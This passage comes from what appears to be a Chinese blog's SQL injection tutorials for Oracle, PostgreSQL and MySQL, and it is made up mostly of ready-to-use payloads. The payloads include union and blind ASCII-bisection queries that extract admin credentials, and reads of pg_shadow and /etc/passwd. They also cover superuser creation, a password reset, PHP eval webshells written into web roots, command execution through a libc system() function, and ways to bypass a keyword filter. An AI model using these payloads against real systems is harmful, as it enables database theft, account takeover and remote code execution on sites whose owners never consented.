title="获取数据库版本"></a>获取数据库版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100 union select null,(select banner from sys.v_$version where rownum=1),null,null,null,null,null,null,null,null,null from dual</span><br></pre></td></tr></table></figure><h3 id="获取操作系统版本"><a href="#获取操作系统版本" class="headerlink" title="获取操作系统版本"></a>获取操作系统版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100 union select null,( select member from v$logfile where rownum=1),null,null,null,null,null,null,null,null,null from dual</span><br></pre></td></tr></table></figure><h3 id="获取连接数据库的当前用户"><a href="#获取连接数据库的当前用户" class="headerlink" title="获取连接数据库的当前用户"></a>获取连接数据库的当前用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100 union select null,( select SYS_CONTEXT (&#x27;USERENV&#x27;,&#x27;CURRENT_USER&#x27;)from dual),null,null,null,null,null,null,null,null,null from dual</span><br></pre></td></tr></table></figure><h3 id="获取第一个表"><a href="#获取第一个表" class="headerlink" title="获取第一个表"></a>获取第一个表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100 union select null,( select table_name from user_tables where rownum=1),null,null,null,null,null,null,null,null,null from dual</span><br></pre></td></tr></table></figure><h3 id="获取第二个表"><a href="#获取第二个表" class="headerlink" title="获取第二个表"></a>获取第二个表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100 union select null,( select table_name from user_tables where rownum=1 and table_name&lt;&gt;&#x27;ACCESS$&#x27;),null,null,null,null,null,null,null,null,null from dual</span><br></pre></td></tr></table></figure><h3 id="获取第三个表"><a href="#获取第三个表" class="headerlink" title="获取第三个表"></a>获取第三个表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100 union select null,( select table_name from user_tables where rownum=1 and table_name&lt;&gt;&#x27;ACCESS$&#x27;and table_name&lt;&gt;&#x27;ALERT_QT&#x27;),null,null,null,null,null,null,null,null,null from dual    </span><br></pre></td></tr></table></figure><h3 id="以此类推就可以得到所有的表名"><a href="#以此类推就可以得到所有的表名" class="headerlink" title="以此类推就可以得到所有的表名"></a>以此类推就可以得到所有的表名</h3><h3 id="获取第一个列名"><a href="#获取第一个列名" class="headerlink" title="获取第一个列名"></a>获取第一个列名</h3><ul><li>假设我们得到管理员表名为：admin</li><li>获取第一个列名EMPLOYEE_ID<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=-100 union select null,(select column_name from user_tab_columns where table_name=&#x27;admin&#x27; and rownum=1),4,5,6 from dual,null,null,null,null,null,null,null,null,null from dual</span><br></pre></td></tr></table></figure><h3 id="获取第二个列名"><a href="#获取第二个列名" class="headerlink" title="获取第二个列名"></a>获取第二个列名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=-100 union select null,(select column_name from user_tab_columns where table_name=&#x27;admin&#x27; and rownum=1 and column_name&lt;&gt;&#x27;EMPLOYEE_ID&#x27;),4,5,6 from dual,null,null,null,null,null,null,null,null,null from dual</span><br></pre></td></tr></table></figure>得到表名为NAME</li></ul><h3 id="获取第三个列名"><a href="#获取第三个列名" class="headerlink" title="获取第三个列名"></a>获取第三个列名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=-100 union select null,(select column_name from user_tab_columns where table_name=&#x27;admin&#x27; and rownum=1 and column_name&lt;&gt;&#x27;EMPLOYEE_ID&#x27; and rownum=1 and column_name&lt;&gt;&#x27;NAME&#x27;),4,5,6 from dual,null,null,null,null,null,null,null,null,null from dual</span><br></pre></td></tr></table></figure><p>得到表名为PASS</p><h3 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,name,4,5,6 from admin</span><br><span class="line">union select 1,2,pass,4,5,6 from admin</span><br></pre></td></tr></table></figure><h3 id="第二种注入方式"><a href="#第二种注入方式" class="headerlink" title="第二种注入方式"></a>第二种注入方式</h3><ul><li><p>判断下该网站下有几个管理员</p></li><li><p>如果有多个的话，成功入侵的几率就会加大</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from admin)=1，返回正常说明只有一个管理员。</span><br></pre></td></tr></table></figure><h3 id="指定表名获取列名"><a href="#指定表名获取列名" class="headerlink" title="指定表名获取列名"></a>指定表名获取列名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(name) from admin)&gt;=0   返回正常，说明存在name字段</span><br></pre></td></tr></table></figure><h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(pass) from admin)&gt;=0返回错误，说明不存在pass字段</span><br></pre></td></tr></table></figure><h4 id="接下来采用ASCII码折半法猜解管理员帐号和密码"><a href="#接下来采用ASCII码折半法猜解管理员帐号和密码" class="headerlink" title="接下来采用ASCII码折半法猜解管理员帐号和密码"></a>接下来采用ASCII码折半法猜解管理员帐号和密码</h4></li><li><p>判断管理员名字长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from admin where length(name)&gt;=5)=1</span><br></pre></td></tr></table></figure></li><li><p>说明：length()函数用于求字符串的长度，此处猜测用户名的长度和5比较</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from admin where ascii(substr(name,1,1))&gt;=97)=1</span><br></pre></td></tr></table></figure><ul><li>说明：substr()函数用于截取字符串，ascii()函数用于获取字符的ascii码，此处的意思是截取name字段的第一个字符，获取它的ascii码值，查询ascii码表可知97为字符a<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from admin where ascii(substr(name,2,1))&gt;=100)=1 </span><br></pre></td></tr></table></figure></li><li>结果为100，即字符d，重复上述过程，可以判断出帐号为admin<h3 id="相同的方法猜解密码"><a href="#相同的方法猜解密码" class="headerlink" title="相同的方法猜解密码"></a>相同的方法猜解密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from admin where length(pwd)&gt;=8)=1，</span><br></pre></td></tr></table></figure>返回正常，即密码长度为8，此时可以判断密码应该为明文<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from admin where ascii(substr(pwd,1,1))&gt;=97)=1，</span><br></pre></td></tr></table></figure>返回正常，为字符a</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from admin where ascii(substr(pwd,2,1))&gt;=100)=1，返回正常，为字符d</span><br><span class="line">and (select count(*) from admin where ascii(substr(pwd,8,1))&gt;=56)=1，返回正常，为数字8</span><br></pre></td></tr></table></figure><h3 id="完成上述操作可以确定帐号为：admin密码为-admin888"><a href="#完成上述操作可以确定帐号为：admin密码为-admin888" class="headerlink" title="完成上述操作可以确定帐号为：admin密码为:admin888"></a>完成上述操作可以确定帐号为：admin密码为:admin888</h3><h1 id="Postgresql-手工注入"><a href="#Postgresql-手工注入" class="headerlink" title="Postgresql 手工注入"></a>Postgresql 手工注入</h1><h2 id="postgresql介绍"><a href="#postgresql介绍" class="headerlink" title="postgresql介绍"></a>postgresql介绍</h2><p>PostgreSQL是以加州大学伯克利分校计算机系开发的 POSTGRES，现在已经更名为PostgreSQL，版本 4.2为基础的对象关系型数据库管理系统（ORDBMS）。PostgreSQL支持大部分 SQL标准并且提供了许多其他现代特性：复杂查询、外键、触发器、视图、事务完整性、MVCC。同样，PostgreSQL 可以用许多方法扩展，比如， 通过增加新的数据类型、函数、操作符、聚集函数、索引。免费使用、修改、和分发 PostgreSQL，不管是私用、商用、还是学术研究使用。</p><h2 id="postgresql数据库注入常用语法"><a href="#postgresql数据库注入常用语法" class="headerlink" title="postgresql数据库注入常用语法"></a>postgresql数据库注入常用语法</h2><p>判断是否为postgresql数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+and+1::int=1--</span><br><span class="line">http://mysql.sql.com/sql.php?id=1+and+1::int=1--</span><br></pre></td></tr></table></figure><p>判断数据库版本信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+and+1=cast(version() as int)--</span><br></pre></td></tr></table></figure><p>判断当前用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=cast(user||123 as int)</span><br></pre></td></tr></table></figure><p>判断有多少字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">order by </span><br><span class="line">union select null,null,null</span><br><span class="line">union select null,user,null   判断当前用户</span><br></pre></td></tr></table></figure><p>判断数据库版本信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select null,version(),null--</span><br></pre></td></tr></table></figure><p>判断用户权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union+select+null,current_schema(),null</span><br></pre></td></tr></table></figure><p>判断当前数据库名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union+select+null,current_database(),null</span><br></pre></td></tr></table></figure><p>判断当前表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union+select+null,relname,null from pg_stat_user_tables</span><br></pre></td></tr></table></figure><p>读取每个表的列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union+select+null,column_name,null+from+information_schema.columns+where+table_name=&#x27;表名&#x27;</span><br></pre></td></tr></table></figure><p>列字段内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+union+select+null,name||pass,null+from+admin</span><br></pre></td></tr></table></figure><p>查看postgresql数据库的账号密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+union+select+null,usename||chr(124)||passwd,null+from+pg_shadow</span><br></pre></td></tr></table></figure><p>创建用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;create+user+seven+with+superuser+password+&#x27;seven&#x27;--</span><br></pre></td></tr></table></figure><p>修改postgres的用户密码为123456</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;alter+user+postgres+with+password+&#x27;123456&#x27;--</span><br></pre></td></tr></table></figure><h2 id="Postgresql-写shell"><a href="#Postgresql-写shell" class="headerlink" title="Postgresql 写shell"></a>Postgresql 写shell</h2><p>直接拿shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql.php?id=1;create table shell(shell text not null);</span><br><span class="line">http://127.0.0.1/sql.php?id=1;insert into shell values($$&lt;?php @eval($_POST[test]);?&gt;$$); </span><br><span class="line">http://127.0.0.1/sql.php?id=1;copy shell(shell) to &#x27;/var/www/html/shell.php&#x27;;</span><br></pre></td></tr></table></figure><p>另一种方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;copy (select &#x27;$$&lt;?php @eval($_POST[test]);?&gt;$$&#x27;) to &#x27;c:/inetpub/wwwroot/mysql-sql/ddd.php&#x27;</span><br></pre></td></tr></table></figure><p>读取文件前20行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pg_read_file(&#x27;/etc/passwd&#x27;,1,20)</span><br></pre></td></tr></table></figure><h2 id="创建system函数"><a href="#创建system函数" class="headerlink" title="创建system函数"></a>创建system函数</h2><ul><li>用于版本大于8的数据库<br>创建一个system的函数：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create FUNCTION system(cstring) RETURNS int AS &#x27;/lib/libc.so.6&#x27;, &#x27;system&#x27; LANGUAGE &#x27;C&#x27; STRICT</span><br></pre></td></tr></table></figure>创建一个输出表：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table stdout(id serial, system_out text)</span><br></pre></td></tr></table></figure>执行shell，输出到输出表内：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select system(&#x27;uname -a &gt; /tmp/test&#x27;)</span><br><span class="line">copy 输出的内容到表里面；</span><br><span class="line">COPY stdout(system_out) FROM &#x27;/tmp/test&#x27;</span><br></pre></td></tr></table></figure>从输出表内读取执行后的回显，判断是否执行成功<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union all select NULL,(select stdout from system_out order by id desc),NULL limit 1 offset 1–-</span><br></pre></td></tr></table></figure><h2 id="数据库备份还原"><a href="#数据库备份还原" class="headerlink" title="数据库备份还原"></a>数据库备份还原</h2></li></ul><p>备份数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pg_dump -O -h 168.192.0.5 -U postgres mdb &gt;c:\mdb.sql”</span><br><span class="line">pg_dump -O -h 192.168.0.5 -U dbowner -w -p 5432 SS &gt;SS.sql 这个是远程备份数据库备份到本地来</span><br></pre></td></tr></table></figure><p>还原数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psql -h localhost -U postgres -d mdb </span><br></pre></td></tr></table></figure><h2 id="判断注入"><a href="#判断注入" class="headerlink" title="判断注入"></a>判断注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">‘  报错</span><br><span class="line">and 1=1 返回正常</span><br><span class="line">and 1=2 返回错误</span><br></pre></td></tr></table></figure><h2 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=cast(version() as int)  获取数据库版本信息系统信息</span><br><span class="line">and 1=cast(user||123 as int)  获取当前用户名称  postgres用户相当于root用户权限</span><br></pre></td></tr></table></figure><h2 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;create table ccc(w text not null);  创建表x</span><br></pre></td></tr></table></figure><h2 id="插入一句话木马"><a href="#插入一句话木马" class="headerlink" title="插入一句话木马"></a>插入一句话木马</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;insert into ccc values($$&lt;?php @eval($_POST[test]);?&gt;$$);  向x表中插入一句话木马</span><br></pre></td></tr></table></figure><h2 id="导出一句话"><a href="#导出一句话" class="headerlink" title="导出一句话"></a>导出一句话</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;copy ccc(w) to $$/home/kasugai_tochi/public_html/script/test.php$$;  将一句话木马保存为test.php文件</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入- Mysql</title>
      <link href="/archives/331769dc.html"/>
      <url>/archives/331769dc.html</url>
      
        <content type="html"><![CDATA[<h1 id="Mysql-介绍"><a href="#Mysql-介绍" class="headerlink" title="Mysql 介绍"></a>Mysql 介绍</h1><p>MySQL是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，目前属于 Oracle 旗下公司。MySQL 最流行的关系型数据库管理系统，在 WEB 应用方面 MySQL 是最好的 RDBMS (Relational Database Management System，关系数据库管理系统) 应用软件之一。MySQL 是一种关联数据库管理系统，关联数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。MySQL 所使用的 SQL 语言是用于访问数据库的最常用标准化语言。MySQL 软件采用了双授权政策（本词条“授权政策”），它分为社区版和商业版，由于其体积小、速度快、总体拥有成本低，尤其是开放源码这一特点，一般中小型网站的开发都选择 MySQL 作为网站数据库。由于其社区版的性能卓越，搭配 PHP 和 Apache 可组成良好的开发环境。</p><h1 id="常见的sql语句"><a href="#常见的sql语句" class="headerlink" title="常见的sql语句"></a>常见的sql语句</h1><ol><li>说明：创建数据库<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE database-name</span><br></pre></td></tr></table></figure></li><li>说明：删除数据库<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop database dbname</span><br></pre></td></tr></table></figure></li><li>说明：创建新表<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE MYTABLE (name VARCHAR(20), sex CHAR(1));</span><br></pre></td></tr></table></figure></li><li>查看数据库<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>插入数据<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into admin(username,password) value (&#x27;admin&#x27;,&#x27;admin&#x27;);</span><br></pre></td></tr></table></figure>查询数据<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin;</span><br></pre></td></tr></table></figure>更新修改数据<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update admin set password=&#x27;adsdf&#x27; where id = 1;</span><br></pre></td></tr></table></figure>删除数据<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from admin where id =1 ;</span><br></pre></td></tr></table></figure></li></ol><h1 id="Mysql-函数"><a href="#Mysql-函数" class="headerlink" title="Mysql 函数"></a>Mysql 函数</h1><ol><li>system_user() 系统用户名</li><li>user()        用户名</li><li>current_user  当前用户名</li><li>session_user()连接数据库的用户名</li><li>database()    数据库名</li><li>version()     MYSQL数据库版本</li><li>load_file()  转成16进制或者是10进制 MYSQL读取本地文件的函数</li><li>@@datadir     读取数据库路径</li><li>@@basedir    MYSQL 安装路径</li><li>@@version_compile_os   操作系统</li></ol><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mid()---从文本字段中提取字符</span><br><span class="line">SELECT MID(column_name,start[,length]) FROM table_name;</span><br><span class="line">column_name必需。要提取字符的字段。</span><br><span class="line">start必需。规定开始位置（起始值是 1）。</span><br><span class="line">length可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。</span><br><span class="line">limit()---返回前几条或者中间某几行数据</span><br><span class="line">select * from table limit m,n;</span><br><span class="line">其m指记录始index0始表示第条记录 n指第m+1条始取n条</span><br><span class="line">select * from user limit 1,2;</span><br><span class="line">Count()---聚集函数，统计元祖的个数</span><br><span class="line">rand()---用于产生一个0~1的随机数</span><br><span class="line">floor()---向下取整</span><br><span class="line">group by---依据我们想要的规则对结果进行分组</span><br><span class="line">select * from user group by host;</span><br><span class="line">length()---返回字符串的长度</span><br><span class="line"> select length(&#x27;www.cracer.com&#x27;);</span><br><span class="line">Substr()---截取字符串 三个参数 （所要截取字符串，截取的位置，截取的长度）</span><br><span class="line">select substr(host,2,3) from user;</span><br><span class="line">Ascii()---返回字符串的ascii码</span><br><span class="line">Select ascii(‘a’);</span><br></pre></td></tr></table></figure><h2 id="Mysql注释"><a href="#Mysql注释" class="headerlink" title="Mysql注释"></a>Mysql注释</h2><p>注释符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#、--、/**/</span><br></pre></td></tr></table></figure><p>内联注释：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*！union*/和/*!50001union*/</span><br></pre></td></tr></table></figure><p>语句中的代替符号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用+、%0a/%0D/和/*ADJFKLASDF--234U23SJFD AND 1=1*/代替空格</span><br></pre></td></tr></table></figure><p>用<code>%</code>或者<code>/**/</code>、<code>%00</code>、<code>%01</code>分割sql语句编码绕过 url编码</p><h1 id="数据库结构对比"><a href="#数据库结构对比" class="headerlink" title="数据库结构对比"></a>数据库结构对比</h1><h1 id="access数据库"><a href="#access数据库" class="headerlink" title="access数据库"></a>access数据库</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">A网站：adata.mdb</span><br><span class="line">表名(admin)</span><br><span class="line">列名(user,pass)</span><br><span class="line">值</span><br><span class="line">B网站：bdata.mdb</span><br><span class="line">表名(admin)</span><br><span class="line">列名(user,pass)</span><br><span class="line">值</span><br></pre></td></tr></table></figure><ul><li>mysql<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A数据库名</span><br><span class="line">B数据库名</span><br><span class="line">表名</span><br><span class="line">列名</span><br><span class="line">值</span><br></pre></td></tr></table></figure><h1 id="Mysql-注入原理"><a href="#Mysql-注入原理" class="headerlink" title="Mysql 注入原理"></a>Mysql 注入原理</h1></li></ul><ol><li>判断注入漏洞<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">And 1=1 and1=2</span><br></pre></td></tr></table></figure></li><li>判断多少列，数字报错减少，正常增加<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Order by 20</span><br></pre></td></tr></table></figure></li><li>union联合查询，报字符列在第几列<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,4,5</span><br></pre></td></tr></table></figure></li><li>在字符列上报相关信息,数据库版本信息，用户，数据库名称（十六进制转换）。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,version(),3,4,5</span><br></pre></td></tr></table></figure></li><li>指定数据库，爆数据库表名<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 from information_schema. tables where table_schema=0x6D7574696130313231</span><br></pre></td></tr></table></figure></li><li>指定表名爆列名<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(column_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 from information_schema. columns where table_name=0x61646D696E</span><br><span class="line">id,name,adminpass,right_li,right_li_b,checks,level_id</span><br></pre></td></tr></table></figure></li><li>查询数据信息<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(name,0x5c,adminpass),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 from  admin</span><br></pre></td></tr></table></figure></li></ol><h1 id="常见的防注入代码"><a href="#常见的防注入代码" class="headerlink" title="常见的防注入代码"></a>常见的防注入代码</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function check_sql($x)&#123;</span><br><span class="line">$inject=array(&quot;select&quot;,&quot;union&quot;,&quot;from&quot;,&quot;and&quot;,&quot;or&quot;);</span><br><span class="line"></span><br><span class="line">$i=str_replace($inject,&quot;&quot;,$x);</span><br><span class="line">return $i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* function check_sql($Sql_Str) &#123;//自动过滤Sql的注入语句。</span><br><span class="line">    $check=preg_match(&#x27;/select|insert|update|delete|\&#x27;|\\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/i&#x27;,$Sql_Str);</span><br><span class="line">    if ($check) &#123;</span><br><span class="line">        echo &#x27;&lt;script language=&quot;JavaScript&quot;&gt;alert(&quot;系统警告：\n\n请不要尝试在参数中包含非法字符尝试注入！&quot;);&lt;/script&gt;&#x27;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $Sql_Str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; */</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="绕过防注入代码"><a href="#绕过防注入代码" class="headerlink" title="绕过防注入代码"></a>绕过防注入代码</h2><ul><li>大小写绕过</li><li>%00编码绕过<h1 id="Mysql-显错注入"><a href="#Mysql-显错注入" class="headerlink" title="Mysql 显错注入"></a>Mysql 显错注入</h1></li></ul><p>判断是否存在注入输入<code>&#39;</code><br>显错注入有很多函数 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">floor()、extractvalue()、updatexml()、geometrycollection()、multipoint()、</span><br><span class="line">polygon()、multipolygon()、linestring()、multilinestring()、exp()</span><br></pre></td></tr></table></figure><h2 id="updatexml的显错利用"><a href="#updatexml的显错利用" class="headerlink" title="updatexml的显错利用"></a>updatexml的显错利用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+                                                        